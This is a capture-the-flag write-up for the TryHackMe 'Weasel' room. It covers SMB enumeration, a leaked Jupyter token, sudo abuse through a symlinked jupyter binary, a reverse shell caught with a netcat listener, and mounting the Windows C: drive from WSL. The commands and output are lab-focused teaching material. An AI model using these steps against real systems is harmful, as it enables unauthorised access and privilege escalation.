---
title: THM Weasel
author: hanhctf
date: 2023-05-25 14:22:22 +0700
categories: [Write-up, THM]
tags: [smb, jupyter notebook]
toc: true
mermaid: true
---

# [**Weasel**](https://www.tryhackme.com/room/weasel)

# Summary

> - SMBclient check valid location  
> - Got jupyter token  
> - Open new Terminal on jupyter notebook  
> - Privilege Escalation on jupyter console  
> - Check linux enviroment(Docker/WSL)  
> - Mount C: drive
> - Got user.txt and root.txt  

# Detail

## NMAP

```
PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8888/tcp  open  http          syn-ack Tornado httpd 6.0.3
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Port 139/445 opoen for SMB service.  
Check SMB with `SMBClient`

```
smbclient -L ////10.10.218.64              
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.218.64 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```  

We can access to `datasci-team`.  
Enumeration in `datasci-team`, we found `jupyter-token.txt` that can access webpage in port `8888`  

Open new `Terminal`
Check some basic command on linux:  

```
(base) dev-datasci@DEV-DATASCI-JUP:~$ id;whoami
uid=1000(dev-datasci) gid=1000(dev-datasci) groups=1000(dev-datasci),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
dev-datasci
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
(base) dev-datasci@DEV-DATASCI-JUP:~$ which jupyter
/home/dev-datasci/anaconda3/bin/jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~$
```

We can run `/home/dev-datasci/.local/bin/jupyter` with sudo without password.  
But  

```
(base) dev-datasci@DEV-DATASCI-JUP:~$ /home/dev-datasci/.local/bin/jupyter
bash: /home/dev-datasci/.local/bin/jupyter: No such file or directory
```

Location `jupyter` is in `/home/dev-datasci/anaconda3/bin/jupyter`  
So Create symbol link from `/home/dev-datasci/anaconda3/bin/jupyter` to `/home/dev-datasci/.local/bin/jupyter`

`ln -s /home/dev-datasci/anaconda3/bin/jupyter /home/dev-datasci/.local/bin/jupyter`

And run with `sudo` `sudo /home/dev-datasci/.local/bin/jupyter console`

We in `jupyter console`.  
On Terminal, we listen on port 9001 and add python3 reverse shell on jupyter console.  

We in  

```
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.51.36] from (UNKNOWN) [10.10.85.46] 50774
root@DEV-DATASCI-JUP:/home/dev-datasci# 

```  

Can not find `root.txt` in `/root` ==> Maybe we are in docker or wsl

```
root@DEV-DATASCI-JUP:/home/dev-datasci# cat /proc/1/cgroup | grep "docker\|lxc\|kube"
cat /proc/1/cgroup | grep "docker\|lxc\|kube"
root@DEV-DATASCI-JUP:/home/dev-datasci# grep -q "Microsoft" /proc/version && echo "WSL" || echo "Not WSL"
grep -q "Microsoft" /proc/version && echo "WSL" || echo "Not WSL"
WSL
root@DEV-DATASCI-JUP:/home/dev-datasci# 

```

OK, we in WSL.

Mount C: drive to /mnt/c

```
root@DEV-DATASCI-JUP:/home/dev-datasci# mount -t drvfs C: /mnt/c
mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:/home/dev-datasci# ls -la /mnt/c
ls -la /mnt/c
ls: cannot read symbolic link '/mnt/c/Documents and Settings': Permission denied
ls: cannot access '/mnt/c/pagefile.sys': Permission denied
ls: '/mnt/c/System Volume Information': Permission denied
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 '$Recycle.Bin'
drwxrwxrwx 1 root root 4096 Mar 14 04:14  .
drwxr-xr-x 1 root root 4096 Aug 25  2022  ..
lrwxrwxrwx 1 root root   12 Aug 25  2022 'Documents and Settings'
drwxrwxrwx 1 root root 4096 Aug 25  2022  PerfLogs
drwxrwxrwx 1 root root 4096 Aug 25  2022 'Program Files'
drwxrwxrwx 1 root root 4096 Aug 25  2022 'Program Files (x86)'
drwxrwxrwx 1 root root 4096 Mar 13 04:47  ProgramData
drwxrwxrwx 1 root root 4096 Aug 25  2022  Recovery
d--x--x--x 1 root root 4096 Aug 25  2022 'System Volume Information'
drwxrwxrwx 1 root root 4096 Aug 25  2022  Users                                                                                                                                                                                              
drwxrwxrwx 1 root root 4096 Mar 13 05:05  Windows                                                                                                                                                                                            
drwxrwxrwx 1 root root 4096 Aug 25  2022  datasci-team                                                                                                                                                                                       
-????????? ? ?    ?       ?            ?  pagefile.sys                                                                                                                                                                                       
root@DEV-DATASCI-JUP:/home/dev-datasci#   
```

***We got both user.txt and root.txt in `/mnt/c`***
